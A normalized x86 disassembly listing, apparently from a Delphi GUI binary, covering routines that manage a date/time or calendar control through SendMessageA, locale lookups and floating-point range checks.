setne [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
lea edx [ ebp - 0xc ]
mov eax edi
call sub_448fb4
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405fc8
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0x184 ] esi
jmp r-xdata
mov [ ebx + 0x20 ] 0xffffffff
lea eax [ ebp - 0x8d ]
push eax
xor ecx ecx
mov edx 0x41c
mov eax esi
call sub_44a180
mov [ ebx + 0x20 ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_404624
mov edx eax
mov ecx 0x80
mov eax [ ebx + 0x28 ]
call sub_408a34
mov eax [ ebx + 0x28 ]
call sub_4089d0
mov [ ebx + 0x24 ] eax
mov eax [ ebp - 0xc ]
call sub_404624
mov edx eax
lea eax [ ebp - 0x8d ]
mov ecx 0x80
call sub_408a34
mov eax [ ebp - 0xc ]
call sub_404424
mov [ ebp + eax - 0x8c ] 0x0
cmp [ esi + 0x227 ] 0x0
je r-xdata
mov eax edi
call sub_435204
mov [ ebx + 0x14 ] eax
mov eax [ edi + 0x16c ]
mov [ ebx + 0x10 ] eax
xor eax eax
mov al [ edi + 0x17d ]
mov al [ eax * 2 + rw-data ]
mov [ ebx + 0x19 ] al
mov eax edi
call sub_434ccc
mov [ ebx + 0x18 ] al
mov eax [ ebp - 0x8 ]
mov [ ebx + 0x1c ] eax
sub_439a0c
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x28a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x28c ]
call [ ebx + 0x288 ]
sub_439a38
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x292 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x294 ]
call [ ebx + 0x290 ]
sub_439a64
push ebx
push esi
add esp 0xfffffff4
mov ebx edx
mov esi eax
mov [ esp ] 0x80000001
mov eax [ esi + 0x2e0 ]
call sub_404624
mov [ esp + 0x4 ] eax
mov eax [ esi + 0x2e4 ]
call sub_404624
mov [ esp + 0x8 ] eax
mov eax esp
push eax
xor eax eax
mov al bl
push eax
push 0x41a
mov eax esi
call sub_44f7b4
push eax
call SendMessageA
add esp 0xc
pop esi
pop ebx
retn
sub_439ac8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_447cd0
mov eax esi
mov edx [ r-xdata ]
call sub_403518
mov [ ebx + 0x20 ] eax
pop esi
pop ebx
retn
sub_439aec
push ebx
mov ebx eax
mov eax ebx
call sub_45557c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403518
mov al [ eax + 0x69 ]
mov edx [ ebx + 0x20 ]
cmp al [ edx + 0x16a ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_439b20
push ebx
mov ebx eax
mov eax ebx
call sub_4555f4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403518
mov eax [ eax + 0x80 ]
mov edx [ ebx + 0x20 ]
cmp eax [ edx + 0x16c ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_439b58
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x20 ]
call sub_434f10
sub_439b78
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x20 ]
call sub_434fac
sub_439b98
test dl dl
je r-xdata
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] 0xff000005
mov [ eax + 0xc ] 0xff000008
mov [ eax + 0x10 ] 0xff000002
mov [ eax + 0x14 ] 0xffffff
mov [ eax + 0x18 ] 0xffffff
mov [ eax + 0x1c ] 0xff000013
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_439be8
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_439cd9
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jne r-xdata
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_4032b8
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_4043c8
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4041fc
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_4032b8
lea eax [ ebp - 0x104 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0x4
lea eax [ ebp - 0x114 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc34
call sub_403b1c
mov eax ebx
mov edx [ r-xdata ]
call sub_4034f4
test al al
jne r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ eax + 0x8 ]
mov [ esi + 0x8 ] edx
mov edx [ eax + 0xc ]
mov [ esi + 0xc ] edx
mov edx [ eax + 0x10 ]
mov [ esi + 0x10 ] edx
mov edx [ eax + 0x14 ]
mov [ esi + 0x14 ] edx
mov edx [ eax + 0x18 ]
mov [ esi + 0x18 ] edx
mov eax [ eax + 0x1c ]
mov [ esi + 0x1c ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439ce0
lea eax [ ebp - 0x4 ]
call sub_404164
retn
sub_439cf4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
cmp eax 0x5
ja r-xdata
mov eax [ ebx + 0x4 ]
call sub_44fab8
test al al
je r-xdata
jmp [ eax * 4 + jump_table_439d0b ]
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_423d18
mov ecx eax
mov edx [ esi * 4 + rw-data ]
mov eax [ ebx + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xd8 ]
mov [ ebx + 0x8 ] edi
jmp r-xdata
mov [ ebx + 0xc ] edi
jmp r-xdata
mov [ ebx + 0x10 ] edi
jmp r-xdata
mov [ ebx + 0x14 ] edi
jmp r-xdata
mov [ ebx + 0x18 ] edi
jmp r-xdata
mov [ ebx + 0x1c ] edi
sub_439d6c
push ebx
mov ebx eax
mov ecx [ ebx + 0x8 ]
xor edx edx
mov eax ebx
call sub_439cf4
mov ecx [ ebx + 0xc ]
mov edx 0x1
mov eax ebx
call sub_439cf4
mov ecx [ ebx + 0x10 ]
mov edx 0x2
mov eax ebx
call sub_439cf4
mov ecx [ ebx + 0x14 ]
mov edx 0x3
mov eax ebx
call sub_439cf4
mov ecx [ ebx + 0x18 ]
mov edx 0x4
mov eax ebx
call sub_439cf4
mov ecx [ ebx + 0x1c ]
mov edx 0x5
mov eax ebx
call sub_439cf4
pop ebx
retn
sub_439dc8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov eax 0x100
call sub_432fc8
mov ecx esi
xor edx edx
mov eax edi
call sub_44b4e0
mov [ edi + 0x245 ] 0x1
mov [ edi + 0x246 ] 0x1
mov eax [ r-xdata ]
mov [ edi + 0x50 ] eax
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_439b98
mov [ edi + 0x208 ] eax
call sub_409d7c
fstp [ edi + 0x210 ]
fwait
mov [ edi + 0x220 ] 0x7
mov [ edi + 0x230 ] 0x1f
mov [ edi + 0x240 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_439e64
push ebx
push esi
call sub_40371c
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44b604
mov eax [ esi + 0x208 ]
call sub_403368
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403704
sub_439e98
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_439f99
push [ fs : eax ]
mov [ fs : eax ] esp
fld [ ebx + 0x228 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
je r-xdata
fld [ ebx + 0x238 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
je r-xdata
fld [ ebp + 0x8 ]
fcomp [ ebx + 0x228 ]
fnstsw ax
sahf
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439fa0
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_404188
retn
fld [ ebp + 0x8 ]
fcomp [ ebx + 0x238 ]
fnstsw ax
sahf
jae r-xdata
push [ ebx + 0x22c ]
push [ ebx + 0x228 ]
lea eax [ ebp - 0xc ]
call sub_40aa08
mov eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ ebx + 0x20c ]
call sub_40bb78
call sub_403b1c
push [ ebx + 0x23c ]
push [ ebx + 0x238 ]
lea eax [ ebp - 0x14 ]
call sub_40aa08
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ ebx + 0x20c ]
call sub_40bb78
call sub_403b1c
sub_439fac
push ebx
mov ebx eax
mov eax ebx
call sub_44c76c
mov eax [ ebx + 0x208 ]
call sub_439d6c
push [ ebx + 0x23c ]
push [ ebx + 0x238 ]
push [ ebx + 0x22c ]
push [ ebx + 0x228 ]
mov eax ebx
call sub_43a5d0
mov edx [ ebx + 0x230 ]
mov eax ebx
call sub_43a418
mov edx [ ebx + 0x240 ]
mov eax ebx
call sub_43a554
mov dl [ ebx + 0x220 ]
mov eax ebx
call sub_43a2c4
cmp [ ebx + 0x244 ] 0x0
je r-xdata
push [ ebx + 0x214 ]
push [ ebx + 0x210 ]
mov eax ebx
call sub_43a1b4
pop ebx
retn
push [ ebx + 0x214 ]
push [ ebx + 0x210 ]
push [ ebx + 0x21c ]
push [ ebx + 0x218 ]
mov eax ebx
call sub_43a720
pop ebx
retn
sub_43a048
xor edx edx
mov dl [ eax + 0x245 ]
mov edx [ edx * 4 + rw-data ]
or edx 0x1
xor ecx ecx
mov cl [ eax + 0x246 ]
or edx [ ecx * 4 + rw-data ]
xor ecx ecx
mov cl [ eax + 0x247 ]
or edx [ ecx * 4 + rw-data ]
movzx eax [ eax + 0x244 ]
or edx [ eax * 4 + rw-data ]
mov eax edx
retn
sub_43a0fc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
push [ eax + 0x214 ]
push [ eax + 0x210 ]
lea eax [ ebp + 0x8 ]
call sub_409dcc
fld [ ebp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jne r-xdata
xor eax eax
push ebp
push sub_43a181
push [ fs : eax ]
mov [ fs : eax ] esp
fld [ ebp + 0x8 ]
call sub_402b28
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] edx
fild [ ebp - 0xc ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xcc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43a1b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_43a1b4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
call sub_409ca4
cmp [ ebx + 0x244 ] 0x0
je r-xdata
mov eax ebx
call sub_44fab8
test al al
je r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebx + 0x21c ]
push [ ebx + 0x218 ]
mov eax ebx
call sub_43a720
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x210 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x214 ] eax
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xdc ]
test al al
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbf8
call sub_403b1c
sub_43a23c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx eax
fld [ ebp + 0x8 ]
call sub_402b28
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
fild [ ebp - 0x10 ]
fstp [ ebp - 0x8 ]
fwait
fld [ ebx + 0x218 ]
call sub_402b28
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
fild [ ebp - 0x10 ]
fcomp [ ebp - 0x8 ]
fnstsw ax
sahf
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x8
fld [ ebp - 0x8 ]
fadd [ r-xdata ]
fstp [ ebp + 0x8 ]
fwait
fld [ ebp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jne r-xdata
mov eax ebx
call sub_43a0cc
add esp 0xfffffff8
fstp [ esp ]
fwait
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
mov eax ebx
call sub_43a720
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
sub_43a2c4
push ebx
push esi
push edi
push ecx
mov ebx edx
mov esi eax
mov eax esi
call sub_44fab8
test al al
je r-xdata
mov [ esi + 0x220 ] bl
pop edx
pop edi
pop esi
pop ebx
retn
cmp bl 0x7
jne r-xdata
mov edi ebx
and edi 0x7f
push 0x2
lea eax [ esp + 0x4 ]
push eax
push 0x100c
push 0x400
call GetLocaleInfoA
movzx edi [ esp ]
sub edi 0x30
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xd0 ]
mov edx edi
call sub_42a09c
mov eax esi
mov edx [ eax ]
call [ edx + 0xd0 ]
test eax eax
je r-xdata
sub_43a32c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x10 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_43a404
push [ fs : eax ]
mov [ fs : eax ] esp
fld [ ebx + 0x238 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
je r-xdata
fld [ ebx + 0x228 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
je r-xdata
fld [ ebp + 0x8 ]
fcomp [ ebx + 0x238 ]
fnstsw ax
sahf
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a40b
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_404188
retn
push [ ebx + 0x23c ]
push [ ebx + 0x238 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax ebx
call sub_43a5d0
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x228 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x22c ] eax
push [ ebx + 0x23c ]
push [ ebx + 0x238 ]
lea eax [ ebp - 0xc ]
call sub_40aa08
mov eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ ebx + 0x20c ]
call sub_40bb78
call sub_403b1c
sub_43a418
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x244 ] 0x0
je r-xdata
mov [ ebx + 0x230 ] esi
pop esi
pop ebx
retn
mov eax ebx
call sub_44fab8
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
mov edx esi
call sub_42a038
test eax eax
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbf8
call sub_403b1c
sub_43a468
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x10 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_43a540
push [ fs : eax ]
mov [ fs : eax ] esp
fld [ ebx + 0x228 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
je r-xdata
fld [ ebx + 0x238 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
je r-xdata
fld [ ebp + 0x8 ]
fcomp [ ebx + 0x228 ]
fnstsw ax
sahf
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a547
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_404188
retn
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebx + 0x22c ]
push [ ebx + 0x228 ]
mov eax ebx
call sub_43a5d0
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x238 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x23c ] eax
push [ ebx + 0x22c ]
push [ ebx + 0x228 ]
lea eax [ ebp - 0xc ]
call sub_40aa08
mov eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ ebx + 0x20c ]
call sub_40bb78
call sub_403b1c
sub_43a554
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44fab8
test al al
je r-xdata
mov [ ebx + 0x240 ] esi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
mov edx esi
call sub_42a0c8
sub_43a590
cmp dl [ eax + 0x244 ]
je r-xdata
retn
mov [ eax + 0x244 ] dl
test dl dl
je r-xdata
xor edx edx
mov [ eax + 0x218 ] edx
mov [ eax + 0x21c ] edx
mov edx [ eax + 0x210 ]
mov [ eax + 0x218 ] edx
mov edx [ eax + 0x214 ]
mov [ eax + 0x21c ] edx
jmp r-xdata
call sub_44cd54
sub_43a5d0
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
mov ebx eax
xor esi esi
fld [ ebp + 0x10 ]
call sub_402b28
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
fld [ ebp + 0x8 ]
call sub_402b28
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
fld [ ebx + 0x210 ]
call sub_402b28
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
fld [ ebx + 0x218 ]
call sub_402b28
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
je r-xdata
cmp [ ebp - 0x18 ] 0x0
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp edx [ ebp - 0x14 ]
jne r-xdata
je r-xdata
cmp [ ebp - 0x20 ] 0x0
jge r-xdata
cmp eax [ ebp - 0x18 ]
jae r-xdata
mov eax ebx
call sub_44fab8
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp edx [ ebp - 0x1c ]
jne r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
cmp edx [ ebp - 0x14 ]
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
mov eax ebx
call sub_43a0fc
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
lea ecx [ ebp - 0x40 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xe0 ]
test al al
jne r-xdata
jle r-xdata
cmp eax [ ebp - 0x20 ]
jbe r-xdata
jge r-xdata
cmp eax [ ebp - 0x18 ]
jae r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbf8
call sub_403b1c
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
cmp edx [ ebp - 0x1c ]
jne r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax ebx
call sub_43a0fc
jmp r-xdata
or esi 0x1
fild [ ebp - 0x18 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
lea eax [ ebp - 0x40 ]
call sub_409ca4
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
mov eax ebx
call sub_43a23c
jmp r-xdata
jle r-xdata
cmp eax [ ebp - 0x20 ]
jbe r-xdata
or esi 0x2
fild [ ebp - 0x20 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
lea eax [ ebp - 0x30 ]
call sub_409ca4
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax ebx
call sub_43a23c
jmp r-xdata
sub_43a720
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
mov ebx eax
cmp [ ebx + 0x244 ] 0x0
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
lea eax [ ebp - 0x20 ]
call sub_409ca4
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
call sub_409ca4
mov eax ebx
call sub_44fab8
test al al
je r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
mov eax ebx
call sub_43a1b4
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebx + 0x210 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebx + 0x214 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x218 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x21c ] eax
mov eax ebx
call sub_44f7b4
lea edx [ ebp - 0x20 ]
call sub_42a050
test eax eax
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbf8
call sub_403b1c
sub_43a82c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov eax [ r-xdata ]
mov [ esi + 0x20c ] eax
xor edx edx
mov eax esi
call sub_439dc8
mov edx 0xbf
mov eax esi
call sub_448748
mov edx 0x9a
mov eax esi
call sub_44876c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax esi
pop esi
pop ebx
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_43a884
push ebx
mov ebx eax
mov eax ebx
call sub_44ed10
mov eax ebx
call sub_44fab8
test al al
je r-xdata
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0x5
mov eax ebx
call sub_44a180
sub_43a8ac
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov ecx [ esi + 0x8 ]
mov edx ecx
mov eax edx
mov eax [ eax + 0x8 ]
sub eax 0xfffffd13
je r-xdata
lea edi [ ecx + 0xc ]
mov eax edi
call sub_43a81c
test al al
jne r-xdata
sub eax 0x2
je r-xdata
cmp [ ebx + 0x244 ] 0x0
je r-xdata
mov eax edi
call sub_409ce4
fstp [ ebx + 0x210 ]
fwait
mov [ esp + 0x8 ] edx
mov eax [ esp + 0x8 ]
mov edx [ eax + 0x1c ]
shl edx 0x2
mov eax [ esp + 0x8 ]
mov eax [ eax + 0x20 ]
xor ecx ecx
call sub_402d24
cmp [ ebx + 0x24a ] 0x0
je r-xdata
dec eax
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
lea edi [ eax + 0x1c ]
mov eax edi
call sub_43a81c
test al al
jne r-xdata
mov eax [ esp + 0x8 ]
mov eax [ eax + 0x20 ]
mov [ esp + 0x4 ] eax
mov eax [ esp + 0x8 ]
mov eax [ eax + 0x1c ]
dec eax
test eax eax
jl r-xdata
jmp r-xdata
mov eax edi
call sub_409ce4
fstp [ ebx + 0x218 ]
fwait
inc eax
mov [ esp + 0xc ] eax
mov [ esp ] 0x0
mov edx [ esp + 0x4 ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebx + 0x24c ]
call [ ebx + 0x248 ]
add [ esp + 0x4 ] 0x4
inc [ esp ]
dec [ esp + 0xc ]
jne r-xdata
sub eax 0xc
mov eax [ esp + 0x8 ]
movzx eax [ eax + 0xe ]
add eax [ esp ]
cmp eax 0xc
jle r-xdata
jmp r-xdata
sub_43a9bc
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_44fab8
test al al
je r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_450248
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax ebx
call sub_44f7b4
lea edx [ ebp - 0x14 ]
call sub_42a068
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x14 ]
mov edx [ edi ]
cmp edx [ ebp - 0x4 ]
jge r-xdata
cmp eax [ esi ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov [ edi ] edx
mov [ esi ] eax
sub_43aa24
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_44c640
mov ecx r-xdata
mov edx ebx
mov eax esi
call sub_44c56c
mov eax esi
mov edx [ eax ]
call [ edx + 0xd4 ]
or [ ebx + 0x4 ] eax
mov eax [ ebx + 0x24 ]
and eax 0xfffffffc
or eax 0x8
mov [ ebx + 0x24 ] eax
pop esi
pop ebx
retn
sub_43aa78
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_44fab8
test al al
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_44f7b4
mov ecx ebp
mov edx edi
call sub_42a080
cmp eax 0xffffffff
setne bl
sub_43aaac
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi eax
mov bl 0x1
mov eax esi
call sub_44fab8
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_44f7b4
mov edx esp
call sub_42a020
cmp eax 0x1
sbb ebx ebx
inc ebx
sub_43aae8
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_44fab8
test al al
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
test edi edi
je r-xdata
mov eax esi
call sub_44f7b4
mov ecx ebp
mov edx edi
call sub_42a0ac
cmp eax 0x1
sbb ebx ebx
inc ebx
sub_43ab20
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebp ecx
mov edi edx
mov esi eax
mov eax esi
call sub_44fab8
test al al
je r-xdata
xor ebx ebx
mov bl 0x1
mov eax esp
push eax
xor ecx ecx
mov edx 0x1009
mov eax esi
call sub_44a180
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ edi ] eax
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ ebp ] eax
jmp r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
sub_43ac30
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43ac9f
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43aca6
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
mov eax rw-data
mov edx [ r-xdata ]
call sub_404bb4
mov eax rw-data
mov edx [ r-xdata ]
call sub_404bb4
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_43aef8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
call sub_42bfc8
mov [ esi + 0x5 ] al
call sub_432ff0
cmp eax 0x60000
setge al
mov [ esi + 0x4 ] al
mov eax esi
call sub_43b7d8
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
